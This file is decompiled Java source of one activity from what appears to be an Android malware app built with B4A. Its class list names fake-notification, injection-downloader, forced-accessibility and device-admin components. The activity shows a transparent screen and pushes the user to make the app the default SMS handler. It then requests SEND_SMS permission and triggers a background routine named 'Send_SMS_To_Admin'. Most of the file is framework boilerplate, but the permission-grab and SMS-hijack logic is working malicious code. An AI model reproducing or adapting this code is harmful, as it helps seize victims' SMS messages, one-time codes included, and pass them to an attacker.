package com.com.androidrr;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AActivity;
import anywheresoftware.b4a.B4AMenuItem;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.Msgbox;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.objects.ActivityWrapper;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.RuntimePermissions;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.ViewWrapper;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Iterator;
import org.eclipse.paho.client.mqttv3.internal.ClientDefaults;

/* loaded from: classes.dex */
public class perm_smsperm extends Activity implements B4AActivity {
    static boolean afterFirstLayout = false;
    public static boolean dontPause = false;
    public static final boolean fullScreen = false;
    public static final boolean includeTitle = false;
    static boolean isFirst = true;
    public static perm_smsperm mostCurrent;
    public static WeakReference<Activity> previousOne;
    public static BA processBA;
    private static boolean processGlobalsRun;
    ActivityWrapper _activity;
    BA activityBA;
    BALayout layout;
    ArrayList<B4AMenuItem> menuItems;
    private Boolean onKeySubExist = null;
    private Boolean onKeyUpSubExist = null;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _activity_pause(boolean z) throws Exception {
        return "";
    }

    public static void _activity_permissionresult(String str, boolean z) throws Exception {
    }

    public static String _globals() throws Exception {
        return "";
    }

    public static String _process_globals() throws Exception {
        return "";
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        Activity activity;
        super.onCreate(bundle);
        mostCurrent = this;
        if (processBA == null) {
            BA BA = new BA(getApplicationContext(), (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.perm_smsperm");
            processBA = BA;
            BA.loadHtSubs(getClass());
            BALayout.setDeviceScale(getApplicationContext().getResources().getDisplayMetrics().density);
        } else {
            WeakReference<Activity> weakReference = previousOne;
            if (weakReference != null && (activity = weakReference.get()) != null && activity != this) {
                BA.LogInfo("Killing previous instance (perm_smsperm).");
                activity.finish();
            }
        }
        processBA.setActivityPaused(true);
        processBA.runHook("oncreate", this, null);
        getWindow().requestFeature(1);
        processBA.sharedProcessBA.activityBA = null;
        BALayout bALayout = new BALayout(this);
        this.layout = bALayout;
        setContentView(bALayout);
        afterFirstLayout = false;
        WaitForLayout waitForLayout = new WaitForLayout();
        if (ServiceHelper.StarterHelper.startFromActivity(this, processBA, waitForLayout, false)) {
            BA.handler.postDelayed(waitForLayout, 5L);
        }
    }

    static class WaitForLayout implements Runnable {
        WaitForLayout() {
        }

        @Override // java.lang.Runnable
        public void run() {
            if (perm_smsperm.afterFirstLayout || perm_smsperm.mostCurrent == null) {
                return;
            }
            if (perm_smsperm.mostCurrent.layout.getWidth() == 0) {
                BA.handler.postDelayed(this, 5L);
                return;
            }
            perm_smsperm.mostCurrent.layout.getLayoutParams().height = perm_smsperm.mostCurrent.layout.getHeight();
            perm_smsperm.mostCurrent.layout.getLayoutParams().width = perm_smsperm.mostCurrent.layout.getWidth();
            perm_smsperm.afterFirstLayout = true;
            perm_smsperm.mostCurrent.afterFirstLayout();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void afterFirstLayout() {
        if (this != mostCurrent) {
            return;
        }
        this.activityBA = new BA(this, this.layout, processBA, "com.com.androidrr", "com.com.androidrr.perm_smsperm");
        processBA.sharedProcessBA.activityBA = new WeakReference<>(this.activityBA);
        ViewWrapper.lastId = 0;
        this._activity = new ActivityWrapper(this.activityBA, "activity");
        Msgbox.isDismissing = false;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            if (isFirst) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            BA BA = processBA;
            BA.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.perm_smsperm", BA, this.activityBA, this._activity, Float.valueOf(Common.Density), mostCurrent);
            this._activity.reinitializeForShell(this.activityBA, "activity");
        }
        initializeProcessGlobals();
        initializeGlobals();
        StringBuilder sb = new StringBuilder();
        sb.append("** Activity (perm_smsperm) Create ");
        sb.append(isFirst ? "(first time)" : "");
        sb.append(" **");
        BA.LogInfo(sb.toString());
        processBA.raiseEvent2(null, true, "activity_create", false, Boolean.valueOf(isFirst));
        isFirst = false;
        if (this != mostCurrent) {
            return;
        }
        processBA.setActivityPaused(false);
        BA.LogInfo("** Activity (perm_smsperm) Resume **");
        processBA.raiseEvent(null, "activity_resume", new Object[0]);
        if (Build.VERSION.SDK_INT >= 11) {
            try {
                Activity.class.getMethod("invalidateOptionsMenu", new Class[0]).invoke(this, null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override // anywheresoftware.b4a.B4AActivity
    public void addMenuItem(B4AMenuItem b4AMenuItem) {
        if (this.menuItems == null) {
            this.menuItems = new ArrayList<>();
        }
        this.menuItems.add(b4AMenuItem);
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        try {
            if (processBA.subExists("activity_actionbarhomeclick")) {
                Class.forName("android.app.ActionBar").getMethod("setHomeButtonEnabled", Boolean.TYPE).invoke(getClass().getMethod("getActionBar", new Class[0]).invoke(this, new Object[0]), true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (processBA.runHook("oncreateoptionsmenu", this, new Object[]{menu})) {
            return true;
        }
        ArrayList<B4AMenuItem> arrayList = this.menuItems;
        if (arrayList == null) {
            return false;
        }
        Iterator<B4AMenuItem> it = arrayList.iterator();
        while (it.hasNext()) {
            B4AMenuItem next = it.next();
            MenuItem add = menu.add(next.title);
            if (next.drawable != null) {
                add.setIcon(next.drawable);
            }
            if (Build.VERSION.SDK_INT >= 11) {
                try {
                    if (next.addToBar) {
                        MenuItem.class.getMethod("setShowAsAction", Integer.TYPE).invoke(add, 1);
                    }
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
            add.setOnMenuItemClickListener(new B4AMenuItemsClickListener(next.eventName.toLowerCase(BA.cul)));
        }
        return true;
    }

    @Override // android.app.Activity
    public boolean onOptionsItemSelected(MenuItem menuItem) {
        if (menuItem.getItemId() == 16908332) {
            processBA.raiseEvent(null, "activity_actionbarhomeclick", new Object[0]);
            return true;
        }
        return super.onOptionsItemSelected(menuItem);
    }

    @Override // android.app.Activity
    public boolean onPrepareOptionsMenu(Menu menu) {
        super.onPrepareOptionsMenu(menu);
        processBA.runHook("onprepareoptionsmenu", this, new Object[]{menu});
        return true;
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        processBA.runHook("onstart", this, null);
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        processBA.runHook("onstop", this, null);
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z) {
        super.onWindowFocusChanged(z);
        if (processBA.subExists("activity_windowfocuschanged")) {
            processBA.raiseEvent2(null, true, "activity_windowfocuschanged", false, Boolean.valueOf(z));
        }
    }

    private class B4AMenuItemsClickListener implements MenuItem.OnMenuItemClickListener {
        private final String eventName;

        public B4AMenuItemsClickListener(String str) {
            this.eventName = str;
        }

        @Override // android.view.MenuItem.OnMenuItemClickListener
        public boolean onMenuItemClick(MenuItem menuItem) {
            perm_smsperm.processBA.raiseEventFromUI(menuItem.getTitle(), this.eventName + "_click", new Object[0]);
            return true;
        }
    }

    public static Class<?> getObject() {
        return perm_smsperm.class;
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (processBA.runHook("onkeydown", this, new Object[]{Integer.valueOf(i), keyEvent})) {
            return true;
        }
        if (this.onKeySubExist == null) {
            this.onKeySubExist = Boolean.valueOf(processBA.subExists("activity_keypress"));
        }
        if (this.onKeySubExist.booleanValue()) {
            if (i == 4 && Build.VERSION.SDK_INT >= 18) {
                HandleKeyDelayed handleKeyDelayed = new HandleKeyDelayed();
                handleKeyDelayed.f359kc = i;
                BA.handler.post(handleKeyDelayed);
                return true;
            }
            if (new HandleKeyDelayed().runDirectly(i)) {
                return true;
            }
        }
        return super.onKeyDown(i, keyEvent);
    }

    private class HandleKeyDelayed implements Runnable {

        /* renamed from: kc */
        int f359kc;

        private HandleKeyDelayed() {
        }

        @Override // java.lang.Runnable
        public void run() {
            runDirectly(this.f359kc);
        }

        public boolean runDirectly(int i) {
            Boolean bool = (Boolean) perm_smsperm.processBA.raiseEvent2(perm_smsperm.this._activity, false, "activity_keypress", false, Integer.valueOf(i));
            if (bool == null || bool.booleanValue()) {
                return true;
            }
            if (i != 4) {
                return false;
            }
            perm_smsperm.this.finish();
            return true;
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyUp(int i, KeyEvent keyEvent) {
        Boolean bool;
        if (processBA.runHook("onkeyup", this, new Object[]{Integer.valueOf(i), keyEvent})) {
            return true;
        }
        if (this.onKeyUpSubExist == null) {
            this.onKeyUpSubExist = Boolean.valueOf(processBA.subExists("activity_keyup"));
        }
        if (this.onKeyUpSubExist.booleanValue() && ((bool = (Boolean) processBA.raiseEvent2(this._activity, false, "activity_keyup", false, Integer.valueOf(i))) == null || bool.booleanValue())) {
            return true;
        }
        return super.onKeyUp(i, keyEvent);
    }

    @Override // android.app.Activity
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        processBA.runHook("onnewintent", this, new Object[]{intent});
    }

    @Override // android.app.Activity
    public void onPause() {
        super.onPause();
        if (this._activity != null && this == mostCurrent) {
            Msgbox.dismiss(true);
            if (!dontPause) {
                BA.LogInfo("** Activity (perm_smsperm) Pause, UserClosed = " + this.activityBA.activity.isFinishing() + " **");
            } else {
                BA.LogInfo("** Activity (perm_smsperm) Pause event (activity is not paused). **");
            }
            if (mostCurrent != null) {
                processBA.raiseEvent2(this._activity, true, "activity_pause", false, Boolean.valueOf(this.activityBA.activity.isFinishing()));
            }
            if (!dontPause) {
                processBA.setActivityPaused(true);
                mostCurrent = null;
            }
            if (!this.activityBA.activity.isFinishing()) {
                previousOne = new WeakReference<>(this);
            }
            Msgbox.isDismissing = false;
            processBA.runHook("onpause", this, null);
        }
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        previousOne = null;
        processBA.runHook("ondestroy", this, null);
    }

    @Override // android.app.Activity
    public void onResume() {
        super.onResume();
        mostCurrent = this;
        Msgbox.isDismissing = false;
        if (this.activityBA != null) {
            BA.handler.post(new ResumeMessage(mostCurrent));
        }
        processBA.runHook("onresume", this, null);
    }

    private static class ResumeMessage implements Runnable {
        private final WeakReference<Activity> activity;

        public ResumeMessage(Activity activity) {
            this.activity = new WeakReference<>(activity);
        }

        @Override // java.lang.Runnable
        public void run() {
            perm_smsperm perm_smspermVar = perm_smsperm.mostCurrent;
            if (perm_smspermVar == null || perm_smspermVar != this.activity.get()) {
                return;
            }
            perm_smsperm.processBA.setActivityPaused(false);
            BA.LogInfo("** Activity (perm_smsperm) Resume **");
            if (perm_smspermVar != perm_smsperm.mostCurrent) {
                return;
            }
            perm_smsperm.processBA.raiseEvent(perm_smspermVar._activity, "activity_resume", null);
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        processBA.onActivityResult(i, i2, intent);
        processBA.runHook("onactivityresult", this, new Object[]{Integer.valueOf(i), Integer.valueOf(i2)});
    }

    private static void initializeGlobals() {
        processBA.raiseEvent2(null, true, "globals", false, null);
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        for (int i2 = 0; i2 < strArr.length; i2++) {
            Object[] objArr = new Object[2];
            objArr[0] = strArr[i2];
            objArr[1] = Boolean.valueOf(iArr[i2] == 0);
            processBA.raiseEventFromDifferentThread(null, null, 0, "activity_permissionresult", true, objArr);
        }
    }

    public static void initializeProcessGlobals() {
        try {
            Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static String _activity_create(boolean z) throws Exception {
        ActivityWrapper activityWrapper = mostCurrent._activity;
        Colors colors = Common.Colors;
        activityWrapper.setColor(Colors.ARGB(0, 0, 0, 0));
        _load_perm();
        return "";
    }

    public static String _activity_resume() throws Exception {
        _load_perm();
        return "";
    }

    public static void _load_perm() throws Exception {
        new ResumableSub_Load_Perm(null).resume(processBA, null);
    }

    public static class ResumableSub_Load_Perm extends BA.ResumableSub {
        Object[] group15;
        int groupLen15;
        int index15;
        perm_smsperm parent;
        int _intisperm = 0;
        JavaObject _context = null;
        JavaObject _so = null;
        String _package = "";

        /* renamed from: _i */
        IntentWrapper f360_i = null;
        String _permission = "";
        boolean _result = false;

        public ResumableSub_Load_Perm(perm_smsperm perm_smspermVar) {
            this.parent = perm_smspermVar;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                switch (this.state) {
                    case -1:
                        return;
                    case 0:
                        this.state = 1;
                        this._intisperm = 1;
                        this._context = new JavaObject();
                        this._context = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), perm_smsperm.mostCurrent._activity.getObject());
                        this._context = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), this._context.RunMethod("getContext", (Object[]) Common.Null));
                        JavaObject javaObject = new JavaObject();
                        this._so = javaObject;
                        this._package = BA.ObjectToString(javaObject.InitializeStatic("android.provider.Telephony.Sms").RunMethod("getDefaultSmsPackage", new Object[]{this._context.getObject()}));
                        break;
                    case 1:
                        this.state = 16;
                        String str = this._package;
                        B4AApplication b4AApplication = Common.Application;
                        if (!str.equals(B4AApplication.getPackageName())) {
                            this.state = 3;
                            break;
                        } else {
                            this.state = 5;
                            break;
                        }
                    case 3:
                        this.state = 16;
                        this._intisperm = 0;
                        IntentWrapper intentWrapper = new IntentWrapper();
                        this.f360_i = intentWrapper;
                        intentWrapper.Initialize("android.provider.Telephony.ACTION_CHANGE_DEFAULT", "");
                        this.f360_i.setFlags(ClientDefaults.MAX_MSG_SIZE);
                        IntentWrapper intentWrapper2 = this.f360_i;
                        B4AApplication b4AApplication2 = Common.Application;
                        intentWrapper2.PutExtra("Telephony.Sms.Intents.EXTRA_PACKAGE_NAME", B4AApplication.getPackageName());
                        Common.StartActivity(perm_smsperm.processBA, this.f360_i.getObject());
                        break;
                    case 5:
                        this.state = 6;
                        this._intisperm = 1;
                        break;
                    case 6:
                        this.state = 15;
                        starter starterVar = perm_smsperm.mostCurrent._starter;
                        RuntimePermissions runtimePermissions = starter._rp;
                        Object[] objArr2 = {RuntimePermissions.PERMISSION_SEND_SMS};
                        this.group15 = objArr2;
                        this.index15 = 0;
                        this.groupLen15 = objArr2.length;
                        this.state = 20;
                        break;
                    case 8:
                        this.state = 9;
                        starter starterVar2 = perm_smsperm.mostCurrent._starter;
                        starter._rp.CheckAndRequest(perm_smsperm.processBA, this._permission);
                        Common.WaitFor("activity_permissionresult", perm_smsperm.processBA, this, null);
                        this.state = 22;
                        return;
                    case 9:
                        this.state = 14;
                        if (!this._result) {
                            this.state = 11;
                            break;
                        } else {
                            this.state = 13;
                            break;
                        }
                    case 11:
                        this.state = 14;
                        this._intisperm = 0;
                        break;
                    case 13:
                        this.state = 14;
                        this._intisperm = 1;
                        break;
                    case 14:
                        this.state = 21;
                        break;
                    case 15:
                        this.state = 16;
                        break;
                    case 16:
                        this.state = 19;
                        if (this._intisperm != 1) {
                            break;
                        } else {
                            this.state = 18;
                            break;
                        }
                    case 18:
                        this.state = 19;
                        BA BA2 = perm_smsperm.processBA;
                        backgroundservice backgroundserviceVar = perm_smsperm.mostCurrent._backgroundservice;
                        Common.CallSubNew(BA2, backgroundservice.getObject(), "Send_SMS_To_Admin");
                        perm_smsperm.mostCurrent._activity.Finish();
                        break;
                    case 19:
                        this.state = -1;
                        break;
                    case 20:
                        this.state = 15;
                        if (this.index15 >= this.groupLen15) {
                            break;
                        } else {
                            this.state = 8;
                            this._permission = BA.ObjectToString(this.group15[this.index15]);
                            break;
                        }
                    case 21:
                        this.state = 20;
                        this.index15++;
                        break;
                    case 22:
                        this.state = 9;
                        this._permission = (String) objArr[0];
                        this._result = ((Boolean) objArr[1]).booleanValue();
                        break;
                }
            }
        }
    }
}
